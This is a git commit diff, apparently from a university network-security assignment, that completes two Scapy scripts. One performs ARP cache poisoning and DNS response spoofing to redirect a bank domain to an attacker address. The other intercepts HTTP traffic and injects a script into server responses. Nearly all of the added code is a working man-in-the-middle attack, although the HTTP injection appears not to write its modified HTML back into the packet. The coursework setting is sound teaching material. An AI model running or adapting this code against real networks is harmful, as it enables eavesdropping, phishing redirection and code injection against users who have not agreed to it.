7ce247ad632e6dbe9cd5aad651dbd87c6175f184
Damian Mirecki <mirecki2@illinois.edu>
2019-11-06 17:12:09 -0600

    CP2 transfer

--- NetSec/cp2.1.dns.py
+++ NetSec/cp2.1.dns.py
@@ -26,6 +26,9 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
+	response = sr1(arp_pack)
+	return response.getlayer(ARP).hwsrc
 
 
 def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
@@ -38,16 +41,50 @@ def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerM
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
+    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
+    send(arp_pack)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
+    send(arp_pack)
 
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+	# The packet should only be intercepted if it's caused from a spoofed ARP table
+	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP:
+		#packet.show()
+		if packet.haslayer(DNS):
+			if packet.getlayer(DNS).qr == 0:
+				debug(f"The above packet is a DNS request packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = serverMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(DNS).qr == 1:
+				debug(f"The above packet is a DNS response packet!")
+				original_length = len(packet.getlayer(UDP))
+				debug(f"The original UDP packet is length {original_length}")
+				ip_length = len(packet.getlayer(IP))
+				debug(f"The original IP packet is length {ip_length}")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				if packet.getlayer(DNS).ancount == 1:
+					# Change the address of www.bankofbailey.com to 10.4.63.200
+					packet[DNS].an.rdata = '10.4.63.200'
+					# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
+					del packet.getlayer(UDP).len
+					del packet.getlayer(IP).len
+					del packet.getlayer(IP).chksum
+					del packet.getlayer(UDP).chksum
+				#packet.show()
+				sendp(packet)
 
 
 if __name__ == "__main__":
@@ -57,13 +94,16 @@ if __name__ == "__main__":
         conf.verb = 0 # minimize scapy verbosity
     conf.iface = args.interface # set default interface
 
+    attackerIP = get_if_addr(args.interface)
     clientIP = args.clientIP
     serverIP = args.serverIP
-    attackerIP = get_if_addr(args.interface)
 
-    clientMAC = mac(clientIP)
-    serverMAC = mac(serverIP)
     attackerMAC = get_if_hwaddr(args.interface)
+    debug(f"Attacker MAC is {attackerMAC}")
+    clientMAC = mac(clientIP)
+    debug(f"Client MAC is {clientMAC}")
+    serverMAC = mac(serverIP)
+    debug(f"Server MAC is {serverMAC}")
 
     # start a new thread to ARP spoof in a loop
     spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
--- NetSec/cp2.1.http.py
+++ NetSec/cp2.1.http.py
@@ -27,6 +27,9 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
+	response = sr1(arp_pack)
+	return response.getlayer(ARP).hwsrc
 
 
 def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
@@ -39,17 +42,87 @@ def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerM
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
+    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
+    send(arp_pack)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
+    send(arp_pack)
 
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
-
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, clientSEQ, clientACK, serverSEQ, serverACK
+	# The packet should only be intercepted if it's caused from a spoofed ARP table
+	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP and packet.haslayer(TCP):
+		packet.show()
+		if packet.getlayer(TCP).flags == "S":
+			debug(f"The above packet is an HTTP SYN packet!")
+			# Change the MAC addresses
+			packet.getlayer(Ether).src = attackerMAC
+			packet.getlayer(Ether).dst = serverMAC
+			#packet.show()
+			sendp(packet)
+		elif packet.getlayer(TCP).flags == "SA":
+			debug(f"The above packet is an HTTP SYN+ACK packet!")
+			# Change the MAC addresses
+			packet.getlayer(Ether).src = attackerMAC
+			packet.getlayer(Ether).dst = clientMAC
+			#packet.show()
+			sendp(packet)
+		elif packet.getlayer(TCP).flags == "A":
+			if packet.getlayer(Ether).src == clientMAC:
+				debug(f"The above packet is an HTTP ACK packet from client!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = serverMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(Ether).src == serverMAC:
+				debug(f"The above packet is an HTTP ACK packet from web server!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				#packet.show()
+				sendp(packet)
+		elif packet.getlayer(TCP).flags == "PA":
+			if packet.getlayer(Ether).src == clientMAC:
+				debug(f"The above packet is an HTTP request packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = serverMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(Ether).src == serverMAC:
+				debug(f"The above packet is an HTTP response packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				# Inject the script in the response
+				new_html = packet[Raw].load.decode('ascii')
+				debug(f"Old HTML is: {new_html}")
+				new_html = new_html.replace("</html>",script)
+				debug(f"New HTML is: {new_html}")
+				#packet.show()
+				sendp(packet)
+		elif packet.getlayer(TCP).flags == "FA":
+			if packet.getlayer(Ether).src == clientMAC:
+				debug(f"The above packet is an HTTP FIN+ACK packet from client!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = serverMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(Ether).src == serverMAC:
+				debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				#packet.show()
+				sendp(packet)
 
 if __name__ == "__main__":
     args = parse_arguments()
@@ -58,13 +131,17 @@ if __name__ == "__main__":
         conf.verb = 0 # minimize scapy verbosity
     conf.iface = args.interface # set default interface
 
+    attackerIP = get_if_addr(args.interface)
     clientIP = args.clientIP
     serverIP = args.serverIP
-    attackerIP = get_if_addr(args.interface)
+    script = "<script>"+args.script+"</script></html>"
 
-    clientMAC = mac(clientIP)
-    serverMAC = mac(serverIP)
     attackerMAC = get_if_hwaddr(args.interface)
+    debug(f"Attacker MAC is {attackerMAC}")
+    clientMAC = mac(clientIP)
+    debug(f"Client MAC is {clientMAC}")
+    serverMAC = mac(serverIP)
+    debug(f"Server MAC is {serverMAC}")
 
     # start a new thread to ARP spoof in a loop
     spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
